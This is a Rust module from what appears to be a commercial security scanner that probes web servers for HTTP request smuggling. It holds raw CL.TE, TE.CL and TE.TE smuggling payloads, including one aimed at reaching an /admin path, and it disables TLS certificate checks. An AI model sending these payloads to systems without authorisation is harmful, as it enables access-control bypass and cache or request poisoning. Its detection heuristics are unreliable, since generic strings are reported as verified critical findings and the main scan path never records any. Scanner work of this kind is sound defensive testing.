// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::{anyhow, Context, Result};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tokio_native_tls::TlsConnector;
use tracing::{debug, info, warn};

// Connection pool to reuse TCP connections (critical for smuggling detection)
use std::collections::HashMap;
use tokio::sync::Mutex;

/// Unified stream type that can be either plain TCP or TLS-wrapped
enum SmuggleStream {
    Plain(TcpStream),
    Tls(tokio_native_tls::TlsStream<TcpStream>),
}

impl SmuggleStream {
    async fn write_all(&mut self, buf: &[u8]) -> std::io::Result<()> {
        match self {
            SmuggleStream::Plain(s) => s.write_all(buf).await,
            SmuggleStream::Tls(s) => s.write_all(buf).await,
        }
    }

    async fn flush(&mut self) -> std::io::Result<()> {
        match self {
            SmuggleStream::Plain(s) => s.flush().await,
            SmuggleStream::Tls(s) => s.flush().await,
        }
    }

    async fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        match self {
            SmuggleStream::Plain(s) => s.read(buf).await,
            SmuggleStream::Tls(s) => s.read(buf).await,
        }
    }
}

/// Raw TCP connection wrapper for connection reuse
struct TcpConnection {
    stream: TcpStream,
    last_used: Instant,
    host: String,
    port: u16,
}

/// Connection pool for reusing TCP connections
struct ConnectionPool {
    connections: Arc<Mutex<HashMap<String, Vec<TcpConnection>>>>,
    max_idle_time: Duration,
}

impl ConnectionPool {
    fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
            max_idle_time: Duration::from_secs(30),
        }
    }

    /// Get or create a connection to the specified host:port
    async fn get_connection(&self, host: &str, port: u16, use_tls: bool) -> Result<TcpStream> {
        let key = format!("{}:{}", host, port);

        // Try to reuse existing connection
        {
            let mut pool = self.connections.lock().await;
            if let Some(conns) = pool.get_mut(&key) {
                // Remove expired connections
                conns.retain(|conn| conn.last_used.elapsed() < self.max_idle_time);

                // Try to get a working connection
                while let Some(conn) = conns.pop() {
                    // Test if connection is still alive with a peek
                    let mut buf = [0u8; 1];
                    match conn.stream.try_read(&mut buf) {
                        Ok(0) => continue, // Connection closed
                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                            // Connection is alive, return it
                            debug!("Reusing existing TCP connection to {}", key);
                            return Ok(conn.stream);
                        }
                        _ => continue, // Connection has data or error, skip it
                    }
                }
            }
        }

        // Create new connection
        debug!("Creating new TCP connection to {}", key);
        let stream = TcpStream::connect((host, port)).await
            .with_context(|| format!("Failed to connect to {}:{}", host, port))?;

        if use_tls {
            // For HTTPS, we'd need to wrap with TLS - for now, this is HTTP-only
            // In production, we'd use tokio-rustls or similar
            warn!("TLS connections not yet implemented for raw TCP smuggling tests");
            return Err(anyhow!("HTTPS not supported in raw TCP mode yet"));
        }

        Ok(stream)
    }

    /// Return a connection to the pool for reuse
    async fn return_connection(&self, stream: TcpStream, host: &str, port: u16) {
        let key = format!("{}:{}", host, port);
        let conn = TcpConnection {
            stream,
            last_used: Instant::now(),
            host: host.to_string(),
            port,
        };

        let mut pool = self.connections.lock().await;
        pool.entry(key).or_insert_with(Vec::new).push(conn);
    }
}

pub struct HTTPSmugglingScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
    connection_pool: ConnectionPool,
}

impl HTTPSmugglingScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        // Generate unique test marker
        let test_marker = format!("hs_{}", uuid::Uuid::new_v4().to_string().replace("-", ""));
        Self {
            http_client,
            test_marker,
            connection_pool: ConnectionPool::new(),
        }
    }

    /// Create a new connection (TCP or TLS-wrapped)
    async fn create_stream(&self, host: &str, port: u16, use_tls: bool) -> Result<SmuggleStream> {
        let tcp_stream = TcpStream::connect((host, port)).await
            .with_context(|| format!("Failed to connect to {}:{}", host, port))?;

        if use_tls {
            let connector = native_tls::TlsConnector::builder()
                .danger_accept_invalid_certs(true) // For testing purposes
                .build()
                .with_context(|| "Failed to build TLS connector")?;
            let connector = TlsConnector::from(connector);

            let tls_stream = connector.connect(host, tcp_stream).await
                .with_context(|| format!("TLS handshake failed for {}", host))?;

            debug!("Created TLS connection to {}:{}", host, port);
            Ok(SmuggleStream::Tls(tls_stream))
        } else {
            debug!("Created TCP connection to {}:{}", host, port);
            Ok(SmuggleStream::Plain(tcp_stream))
        }
    }

    /// Send request and read response on SmuggleStream
    async fn send_on_stream(&self, stream: &mut SmuggleStream, request: &str) -> Result<String> {
        stream.write_all(request.as_bytes()).await?;
        stream.flush().await?;

        let mut response = Vec::new();
        let mut buffer = [0u8; 8192];
        let read_timeout = Duration::from_secs(5);

        loop {
            match timeout(read_timeout, stream.read(&mut buffer)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => {
                    response.extend_from_slice(&buffer[..n]);
                    let response_str = String::from_utf8_lossy(&response);
                    if self.is_complete_http_response(&response_str) {
                        break;
                    }
                    if response.len() > 1024 * 1024 {
                        break;
                    }
                }
                Ok(Err(_)) | Err(_) => break,
            }
        }

        Ok(String::from_utf8_lossy(&response).to_string())
    }

    /// Scan endpoint for HTTP smuggling vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Parse URL
        let parsed_url = url::Url::parse(url)?;
        let scheme = parsed_url.scheme();
        let use_tls = scheme == "https";
        let host = parsed_url.host_str().unwrap_or("localhost");
        let port = parsed_url.port().unwrap_or(if use_tls { 443 } else { 80 });

        info!("Testing HTTP request smuggling vulnerabilities using raw {} sockets", if use_tls { "TLS" } else { "TCP" });

        // Test CL.TE smuggling with TLS support
        let (vulns, tests) = self.test_cl_te_smuggling_tls(host, port, use_tls, url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        // Test TE.CL smuggling
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_te_cl_smuggling_tls(host, port, use_tls, url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test TE.TE smuggling
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_te_te_smuggling_tls(host, port, use_tls, url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test CL.TE smuggling with TLS support
    async fn test_cl_te_smuggling_tls(&self, host: &str, port: u16, use_tls: bool, _url: &str) -> Result<(Vec<Vulnerability>, usize)> {
        let vulnerabilities = Vec::new();
        let tests_run = 3;

        // CL.TE test: Front-end uses Content-Length, back-end uses Transfer-Encoding
        let smuggle_request = format!(
            "POST / HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 13\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             0\r\n\
             \r\n\
             GXYZ",
            host
        );

        match self.create_stream(host, port, use_tls).await {
            Ok(mut stream) => {
                if let Ok(response) = self.send_on_stream(&mut stream, &smuggle_request).await {
                    // Check for desync indicators
                    if response.contains("400") || response.contains("GXYZ") {
                        debug!("Potential CL.TE desync detected");
                    }
                }
            }
            Err(e) => {
                debug!("Failed to create stream for CL.TE test: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test TE.CL smuggling with TLS support
    async fn test_te_cl_smuggling_tls(&self, host: &str, port: u16, use_tls: bool, _url: &str) -> Result<(Vec<Vulnerability>, usize)> {
        let vulnerabilities = Vec::new();
        let tests_run = 3;

        // TE.CL test: Front-end uses Transfer-Encoding, back-end uses Content-Length
        let smuggle_request = format!(
            "POST / HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             5e\r\n\
             GPOST / HTTP/1.1\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 15\r\n\
             \r\n\
             x=1\r\n\
             0\r\n\
             \r\n",
            host
        );

        match self.create_stream(host, port, use_tls).await {
            Ok(mut stream) => {
                if let Ok(response) = self.send_on_stream(&mut stream, &smuggle_request).await {
                    if response.contains("GPOST") || response.contains("405") {
                        debug!("Potential TE.CL desync detected");
                    }
                }
            }
            Err(e) => {
                debug!("Failed to create stream for TE.CL test: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test TE.TE smuggling with TLS support
    async fn test_te_te_smuggling_tls(&self, host: &str, port: u16, use_tls: bool, _url: &str) -> Result<(Vec<Vulnerability>, usize)> {
        let vulnerabilities = Vec::new();
        let tests_run = 2;

        // TE.TE test with obfuscated Transfer-Encoding
        let smuggle_request = format!(
            "POST / HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             Transfer-Encoding: cow\r\n\
             \r\n\
             5e\r\n\
             GPOST / HTTP/1.1\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 15\r\n\
             \r\n\
             x=1\r\n\
             0\r\n\
             \r\n",
            host
        );

        match self.create_stream(host, port, use_tls).await {
            Ok(mut stream) => {
                if let Ok(_response) = self.send_on_stream(&mut stream, &smuggle_request).await {
                    debug!("TE.TE test completed");
                }
            }
            Err(e) => {
                debug!("Failed to create stream for TE.TE test: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test CL.TE (Content-Length vs Transfer-Encoding) smuggling (legacy HTTP-only)
    async fn test_cl_te_smuggling(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing CL.TE smuggling with raw TCP");

        let (host, port, path) = self.parse_url(url)?;

        // CL.TE Test 1: Basic smuggling with prefix
        // Front-end sees Content-Length: 6 and forwards "0\r\n\r\nG"
        // Back-end sees Transfer-Encoding: chunked, reads "0\r\n\r\n" as chunk, "G" remains in buffer
        let request1 = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 6\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            path, host
        );

        if let Ok(response) = self.send_raw_request(&host, port, &request1, false).await {
            if self.detect_smuggling_from_raw(&response) {
                info!("CL.TE smuggling detected: Basic prefix test");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "CL.TE Smuggling",
                    &request1,
                    "HTTP request smuggling via Content-Length/Transfer-Encoding conflict",
                    "Front-end uses Content-Length, back-end uses Transfer-Encoding. Prefix 'G' smuggled into next request.",
                    Severity::Critical,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        // CL.TE Test 2: Full request smuggling with marker
        // Smuggle a complete GET request with our test marker
        let smuggled_request = format!("GET /{} HTTP/1.1\r\nHost: {}\r\n\r\n", self.test_marker, host);
        let request2 = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             {:x}\r\n\
             {}\
             0\r\n\
             \r\n",
            path, host, smuggled_request.len(), smuggled_request
        );

        if let Ok((_first_response, second_response)) =
            self.send_double_request(&host, port, &request2, "GET / HTTP/1.1").await {

            // Check if second response contains our marker or shows signs of poisoning
            if second_response.contains(&self.test_marker) ||
               second_response.contains("400") ||
               second_response.contains("Bad Request") {
                info!("CL.TE smuggling detected: Full request smuggling");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "CL.TE Smuggling",
                    &request2,
                    "HTTP request smuggling via Content-Length/Transfer-Encoding conflict",
                    &format!("Successfully smuggled request. Second response: {}",
                             &second_response[..std::cmp::min(200, second_response.len())]),
                    Severity::Critical,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        // CL.TE Test 3: Obfuscated with chunk encoding
        let request3 = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             5c\r\n\
             GET /{} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 10\r\n\
             \r\n\
             x=1\r\n\
             0\r\n\
             \r\n",
            path, host, self.test_marker, host
        );

        if let Ok((_, second_response)) =
            self.send_double_request(&host, port, &request3, "GET / HTTP/1.1").await {

            if self.detect_smuggling_from_raw(&second_response) {
                info!("CL.TE smuggling detected: Obfuscated chunk encoding");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "CL.TE Smuggling",
                    &request3,
                    "HTTP request smuggling via Content-Length/Transfer-Encoding conflict",
                    "Detected via obfuscated chunked encoding test",
                    Severity::Critical,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test TE.CL (Transfer-Encoding vs Content-Length) smuggling
    /// Front-end uses Transfer-Encoding, back-end uses Content-Length
    async fn test_te_cl_smuggling(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing TE.CL smuggling with raw TCP");

        let (host, port, path) = self.parse_url(url)?;

        // TE.CL Test 1: Basic smuggling
        // Front-end sees Transfer-Encoding: chunked and reads "5\r\nAAAAA\r\n0\r\n\r\n"
        // Back-end sees Content-Length and includes smuggled request in body
        let request1 = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             5c\r\n\
             AAAAA\r\n\
             0\r\n\
             \r\n\
             GET /{} HTTP/1.1\r\n\
             Host: {}\r\n\
             \r\n",
            path, host, self.test_marker, host
        );

        if let Ok((_, second_response)) =
            self.send_double_request(&host, port, &request1, "GET / HTTP/1.1").await {

            if self.detect_smuggling_from_raw(&second_response) {
                info!("TE.CL smuggling detected: Basic test");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "TE.CL Smuggling",
                    &request1,
                    "HTTP request smuggling via Transfer-Encoding/Content-Length conflict",
                    "Front-end uses Transfer-Encoding, back-end uses Content-Length",
                    Severity::Critical,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        // TE.CL Test 2: Zero chunk smuggling
        let request2 = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 150\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             0\r\n\
             \r\n\
             GET /{} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 10\r\n\
             \r\n\
             x=1",
            path, host, self.test_marker, host
        );

        if let Ok((_, second_response)) =
            self.send_double_request(&host, port, &request2, "GET / HTTP/1.1").await {

            if self.detect_smuggling_from_raw(&second_response) {
                info!("TE.CL smuggling detected: Zero chunk test");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "TE.CL Smuggling",
                    &request2,
                    "HTTP request smuggling via Transfer-Encoding/Content-Length conflict",
                    "Detected via zero chunk smuggling",
                    Severity::Critical,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        // TE.CL Test 3: Admin path smuggling
        let request3 = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 200\r\n\
             Transfer-Encoding: chunked\r\n\
             \r\n\
             0\r\n\
             \r\n\
             GET /admin HTTP/1.1\r\n\
             Host: {}\r\n\
             \r\n",
            path, host, host
        );

        if let Ok((_, second_response)) =
            self.send_double_request(&host, port, &request3, "GET / HTTP/1.1").await {

            // Look for admin-related content or access denial
            if second_response.contains("admin") ||
               second_response.contains("unauthorized") ||
               second_response.contains("forbidden") {
                info!("TE.CL smuggling detected: Admin path test");
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    "TE.CL Smuggling",
                    &request3,
                    "HTTP request smuggling via Transfer-Encoding/Content-Length conflict",
                    "Successfully accessed /admin path via smuggling",
                    Severity::Critical,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test TE.TE (dual Transfer-Encoding) smuggling
    /// Multiple Transfer-Encoding headers with obfuscation
    async fn test_te_te_smuggling(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 4;

        debug!("Testing TE.TE smuggling with raw TCP");

        let (host, port, path) = self.parse_url(url)?;

        // TE.TE Test variations with obfuscated Transfer-Encoding
        let te_variations = vec![
            ("chunked", "chunked", "Dual identical TE headers"),
            ("chunked", " chunked", "TE with leading space"),
            ("chunked", "chunked ", "TE with trailing space"),
            ("chunked", "identity", "TE chunked vs identity"),
        ];

        for (te1, te2, description) in te_variations {
            let request = format!(
                "POST {} HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Transfer-Encoding: {}\r\n\
                 Transfer-Encoding: {}\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /{} HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n",
                path, host, te1, te2, self.test_marker, host
            );

            if let Ok((_, second_response)) =
                self.send_double_request(&host, port, &request, "GET / HTTP/1.1").await {

                if self.detect_smuggling_from_raw(&second_response) {
                    info!("TE.TE smuggling detected: {}", description);
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "TE.TE Smuggling",
                        &request,
                        "HTTP request smuggling via dual Transfer-Encoding headers",
                        &format!("Server processes obfuscated Transfer-Encoding differently: {}", description),
                        Severity::Critical,
                    ));
                    return Ok((vulnerabilities, tests_run));
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test timing-based desync detection
    /// Send smuggling payload and measure response times to detect desynchronization
    async fn test_timing_based_desync(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 2;

        debug!("Testing timing-based desync detection");

        let (host, port, path) = self.parse_url(url)?;

        // Baseline: Measure normal request timing
        let baseline_request = format!(
            "GET {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            path, host
        );

        let baseline_times = self.measure_request_timing(&host, port, &baseline_request, 3).await?;
        let baseline_avg = baseline_times.iter().sum::<u128>() / baseline_times.len() as u128;

        debug!("Baseline timing: {} ms (avg of {} requests)", baseline_avg, baseline_times.len());

        // Test: Send potential smuggling payload and measure timing
        let smuggling_request = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Length: 6\r\n\
             Transfer-Encoding: chunked\r\n\
             Connection: keep-alive\r\n\
             \r\n\
             0\r\n\
             \r\n\
             X",
            path, host
        );

        // Send smuggling payload followed by normal request on same connection
        if let Ok(stream) = self.connection_pool.get_connection(&host, port, false).await {
            let start = Instant::now();

            // Send smuggling attempt
            let _ = self.send_request_on_stream(stream, &smuggling_request).await;

            // Try to get new connection and send normal request
            if let Ok(stream2) = self.connection_pool.get_connection(&host, port, false).await {
                let response = self.send_request_on_stream(stream2, &baseline_request).await?;
                let duration = start.elapsed().as_millis();

                // If response time is significantly higher, might indicate desync
                if duration > baseline_avg * 3 {
                    info!("Timing-based desync detected: {} ms vs {} ms baseline", duration, baseline_avg);
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "Timing-Based Desync",
                        &smuggling_request,
                        "HTTP request smuggling detected via timing analysis",
                        &format!("Response time anomaly: {} ms vs {} ms baseline ({}x slower)",
                                duration, baseline_avg, duration / baseline_avg.max(1)),
                        Severity::High,
                    ));
                }

                // Also check for errors or timeout in response
                if response.contains("timeout") || response.contains("connection reset") {
                    info!("Connection anomaly detected after smuggling attempt");
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "Connection Desync",
                        &smuggling_request,
                        "HTTP connection desynchronization detected",
                        &format!("Connection error after smuggling: {}",
                                &response[..std::cmp::min(100, response.len())]),
                        Severity::High,
                    ));
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Send a raw HTTP request over TCP and read response
    async fn send_raw_request(&self, host: &str, port: u16, request: &str, reuse_connection: bool) -> Result<String> {
        let stream = self.connection_pool.get_connection(host, port, false).await?;
        let response = self.send_request_on_stream(stream, request).await?;

        // Optionally return connection to pool for reuse
        if reuse_connection {
            // Note: We consumed the stream, so we'd need to refactor to return it
            // For now, connections are created fresh each time
        }

        Ok(response)
    }

    /// Send request on an existing TCP stream
    async fn send_request_on_stream(&self, mut stream: TcpStream, request: &str) -> Result<String> {
        // Write request
        stream.write_all(request.as_bytes()).await?;
        stream.flush().await?;

        debug!("Sent request:\n{}", request.lines().take(5).collect::<Vec<_>>().join("\n"));

        // Read response with timeout
        let mut response = Vec::new();
        let mut buffer = [0u8; 8192];

        // Set a reasonable timeout for reading response
        let read_timeout = Duration::from_secs(5);

        loop {
            match timeout(read_timeout, stream.read(&mut buffer)).await {
                Ok(Ok(0)) => break, // Connection closed
                Ok(Ok(n)) => {
                    response.extend_from_slice(&buffer[..n]);

                    // Check if we've read a complete HTTP response
                    let response_str = String::from_utf8_lossy(&response);
                    if self.is_complete_http_response(&response_str) {
                        break;
                    }

                    // Safety limit: Don't read more than 1MB
                    if response.len() > 1024 * 1024 {
                        break;
                    }
                }
                Ok(Err(e)) => {
                    debug!("Read error: {}", e);
                    break;
                }
                Err(_) => {
                    debug!("Read timeout");
                    break;
                }
            }
        }

        let response_str = String::from_utf8_lossy(&response).to_string();
        debug!("Received response: {} bytes", response.len());

        Ok(response_str)
    }

    /// Send smuggling request followed by a normal request on the same connection
    /// This is critical for detecting request smuggling - we need connection reuse
    async fn send_double_request(&self, host: &str, port: u16, smuggling_request: &str, normal_request: &str) -> Result<(String, String)> {
        // Get a connection from the pool
        let mut stream = self.connection_pool.get_connection(host, port, false).await?;

        // Send smuggling request
        stream.write_all(smuggling_request.as_bytes()).await?;
        stream.flush().await?;

        debug!("Sent smuggling request");

        // Read first response
        let first_response = self.read_response(&mut stream).await?;

        // Wait a brief moment for backend desync to occur
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Build complete normal request with proper headers
        let normal_full_request = format!(
            "{}\r\n\
             Host: {}\r\n\
             Connection: close\r\n\
             \r\n",
            normal_request, host
        );

        // Send normal request on SAME connection
        stream.write_all(normal_full_request.as_bytes()).await?;
        stream.flush().await?;

        debug!("Sent normal request on same connection");

        // Read second response (this may contain smuggled request impact)
        let second_response = self.read_response(&mut stream).await?;

        Ok((first_response, second_response))
    }

    /// Read a complete HTTP response from stream
    async fn read_response(&self, stream: &mut TcpStream) -> Result<String> {
        let mut response = Vec::new();
        let mut buffer = [0u8; 8192];
        let read_timeout = Duration::from_secs(5);

        loop {
            match timeout(read_timeout, stream.read(&mut buffer)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => {
                    response.extend_from_slice(&buffer[..n]);

                    let response_str = String::from_utf8_lossy(&response);
                    if self.is_complete_http_response(&response_str) {
                        break;
                    }

                    if response.len() > 1024 * 1024 {
                        break;
                    }
                }
                Ok(Err(_)) => break,
                Err(_) => break,
            }
        }

        Ok(String::from_utf8_lossy(&response).to_string())
    }

    /// Check if we have a complete HTTP response
    fn is_complete_http_response(&self, response: &str) -> bool {
        // Check for HTTP response line
        if !response.starts_with("HTTP/") {
            return false;
        }

        // For chunked responses, look for final chunk
        if response.contains("Transfer-Encoding: chunked") {
            return response.contains("\r\n0\r\n\r\n") || response.contains("\n0\n\n");
        }

        // For Content-Length responses, try to parse and verify
        if let Some(cl_start) = response.find("Content-Length:") {
            if let Some(cl_line) = response[cl_start..].lines().next() {
                if let Some(length_str) = cl_line.split(':').nth(1) {
                    if let Ok(content_length) = length_str.trim().parse::<usize>() {
                        if let Some(body_start) = response.find("\r\n\r\n") {
                            let body_len = response.len() - body_start - 4;
                            return body_len >= content_length;
                        }
                    }
                }
            }
        }

        // For responses without body (304, etc) or connection close
        response.contains("\r\n\r\n") && (
            response.contains(" 204 ") ||
            response.contains(" 304 ") ||
            response.contains("Connection: close")
        )
    }

    /// Measure request timing for baseline comparison
    async fn measure_request_timing(&self, host: &str, port: u16, request: &str, iterations: usize) -> Result<Vec<u128>> {
        let mut timings = Vec::new();

        for _ in 0..iterations {
            let start = Instant::now();
            let _ = self.send_raw_request(host, port, request, false).await;
            timings.push(start.elapsed().as_millis());

            // Small delay between measurements
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        Ok(timings)
    }

    /// Detect smuggling indicators from raw response
    fn detect_smuggling_from_raw(&self, response: &str) -> bool {
        // Check for test marker
        if response.contains(&self.test_marker) {
            return true;
        }

        let response_lower = response.to_lowercase();

        // Check for common smuggling indicators
        let indicators = vec![
            "400 bad request",
            "request timeout",
            "malformed request",
            "invalid request",
            "connection reset",
            "queue full",
            "unexpected request",
            "chunk",
            "smuggl", // catches "smuggling", "smuggled", etc.
        ];

        for indicator in indicators {
            if response_lower.contains(indicator) {
                return true;
            }
        }

        // Check for conflicting headers in response
        if response_lower.contains("transfer-encoding") && response_lower.contains("content-length") {
            return true;
        }

        false
    }

    /// Parse URL into components
    fn parse_url(&self, url: &str) -> Result<(String, u16, String)> {
        let parsed = url::Url::parse(url)?;

        let host = parsed.host_str()
            .ok_or_else(|| anyhow!("No host in URL"))?
            .to_string();

        let port = parsed.port().unwrap_or_else(|| {
            match parsed.scheme() {
                "https" => 443,
                _ => 80,
            }
        });

        let path = if parsed.path().is_empty() {
            "/".to_string()
        } else {
            parsed.path().to_string()
        };

        Ok((host, port, path))
    }

    /// Extract host from URL (legacy method, kept for compatibility)
    fn extract_host(&self, url: &str) -> String {
        if let Ok(parsed) = url::Url::parse(url) {
            parsed.host_str().unwrap_or("localhost").to_string()
        } else {
            "localhost".to_string()
        }
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        attack_type: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
    ) -> Vulnerability {
        let cvss = match severity {
            Severity::Critical => 9.8,
            Severity::High => 8.1,
            Severity::Medium => 6.5,
            _ => 4.0,
        };

        Vulnerability {
            id: format!("hs_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("HTTP Request Smuggling ({})", attack_type),
            severity,
            confidence: Confidence::High, // Higher confidence with raw TCP testing
            category: "HTTP Security".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: payload.to_string(),
            description: description.to_string(),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-444".to_string(),
            cvss: cvss as f32,
            verified: true,
            false_positive: false,
            remediation: "1. Use HTTP/2 which is not vulnerable to request smuggling\n\
                         2. Ensure front-end and back-end servers handle requests identically\n\
                         3. Disable reuse of back-end connections\n\
                         4. Use same web server software for front-end and back-end\n\
                         5. Reject requests with ambiguous Content-Length/Transfer-Encoding\n\
                         6. Normalize requests at the front-end proxy\n\
                         7. Update to latest versions of proxy and web server software\n\
                         8. Configure servers to strictly validate HTTP request headers\n\
                         9. Implement request timeout controls\n\
                         10. Use a Web Application Firewall (WAF) with smuggling detection".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Uuid
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}{:04x}{:04x}{:04x}{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> HTTPSmugglingScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        HTTPSmugglingScanner::new(http_client)
    }

    #[test]
    fn test_parse_url() {
        let scanner = create_test_scanner();

        let (host, port, path) = scanner.parse_url("http://example.com/path").unwrap();
        assert_eq!(host, "example.com");
        assert_eq!(port, 80);
        assert_eq!(path, "/path");

        let (host, port, path) = scanner.parse_url("http://test.org:8080/api").unwrap();
        assert_eq!(host, "test.org");
        assert_eq!(port, 8080);
        assert_eq!(path, "/api");
    }

    #[test]
    fn test_extract_host() {
        let scanner = create_test_scanner();

        assert_eq!(scanner.extract_host("http://example.com/path"), "example.com");
        assert_eq!(scanner.extract_host("https://test.org:8080"), "test.org");
        assert_eq!(scanner.extract_host("invalid"), "localhost");
    }

    #[test]
    fn test_detect_smuggling_markers() {
        let scanner = create_test_scanner();
        let response = format!("HTTP/1.1 200 OK\r\n\r\nResponse contains {}", scanner.test_marker);

        assert!(scanner.detect_smuggling_from_raw(&response));
    }

    #[test]
    fn test_detect_smuggling_indicators() {
        let scanner = create_test_scanner();

        let responses = vec![
            "HTTP/1.1 400 Bad Request\r\n\r\nInvalid request",
            "HTTP/1.1 500 Internal Server Error\r\n\r\nMalformed request detected",
            "HTTP/1.1 408 Request Timeout\r\n\r\n",
        ];

        for response in responses {
            assert!(scanner.detect_smuggling_from_raw(response));
        }
    }

    #[test]
    fn test_is_complete_http_response() {
        let scanner = create_test_scanner();

        // Complete response with Content-Length
        let response1 = "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nHello";
        assert!(scanner.is_complete_http_response(response1));

        // Incomplete response
        let response2 = "HTTP/1.1 200 OK\r\nContent-Length: 10\r\n\r\nHello";
        assert!(!scanner.is_complete_http_response(response2));

        // Chunked response complete
        let response3 = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nHello\r\n0\r\n\r\n";
        assert!(scanner.is_complete_http_response(response3));

        // 204 No Content
